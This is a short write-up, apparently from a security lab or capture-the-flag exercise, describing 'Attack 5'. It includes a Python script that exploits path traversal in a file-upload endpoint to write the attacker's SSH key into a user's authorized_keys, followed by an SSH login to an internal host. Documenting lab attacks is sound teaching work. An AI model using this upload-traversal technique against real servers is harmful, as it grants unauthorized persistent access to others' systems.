# Attack 5
## SSH key upload
We upload our ssh key to their server by sending our ssh key as a file to their server. And also saving it in the right directory on their server.
This was the script we used to upload our ssh key:
```python
upload_key = {
"file": (
"/../../.ssh/authorized_keys",
open("./ssh_key", "rb"),
"application/octet-stream"
)
}
url = "https://dropbox.internal.regjeringen.uiaikt.no/"
response = requests.post(url, files=upload_key)
print(response.text)
```
This gives us a response with the path to our ssh key on their server:
`/home/ingridnilsen/.ssh/authorized_keys`. Which means that we saved the SSH key on Ingrid Nilsens user.
We can then log in as `ingridnilsen` through SSH:
`ssh ingridnilsen@10.13.13.253`